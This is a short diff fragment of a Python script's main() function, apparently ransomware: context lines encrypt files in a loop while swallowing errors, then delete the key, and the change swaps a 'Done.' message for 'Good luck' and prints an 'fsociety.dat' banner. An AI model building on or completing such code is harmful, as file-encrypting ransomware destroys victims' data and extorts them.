@@ -138,9 +138,11 @@ def main():
             encrypt(START, file, key)
         except:
             pass
-    print("Done.")
-    # TODO
-    print("Print logo")
+    print("Good luck")
+    print()
+    with open('fsociety.dat') as f:
+        for line in f:
+            print(line)
     del key
     exit(0)
 
